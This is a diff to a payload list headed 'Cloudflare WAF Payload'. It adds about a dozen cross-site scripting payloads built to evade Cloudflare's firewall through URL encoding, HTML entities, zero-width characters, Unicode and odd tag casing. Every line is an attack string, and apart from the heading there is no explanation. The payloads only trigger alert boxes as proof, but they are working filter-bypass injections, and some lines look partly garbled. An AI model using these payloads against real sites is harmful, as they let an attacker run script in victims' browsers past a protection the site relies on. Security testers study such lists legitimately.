@@ -1,3 +1,18 @@
-A CloudFlare bypass payload:
+Cloudflare WAF Payload:
 xss payload: "%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+xss payload: &lt;img longdesc="src='x'onerror​=alert(document.domain);//&gt;&lt;img " src='showme'&gt;
+
+?msg=%3Csvg%2Fonload%3Dalert%28%22XSS%22%29%20%3E, <svg/onload​=alert("XSS") > 
+utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
+<a+HREF="%26%237 javascrip%26%239t: alert%261par;document .domain) *> 
+”/>&_lt;_script>alert(1)&_lt;/script>”/>
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover​=prompt&#40;1&#41;&#47;&#47;">XYZ</a>
+<​script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/<​/script /***/
+ellm1%3cscript%3ealert(1)%3c%2fscript%3ec2xwc
+"><iNput///type="password"////id="CF-bypaSS" name="query"////value=""///oNfocUs​="alert('hello')" AutOfoCus="" />
+&lt;img longdesc="src='x'onerror​=alert(document.domain);//&gt;&lt;img " src='showme'&gt;
+<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+<math><x xlink:href=javascript​:confirm`1`>click
+
+
 
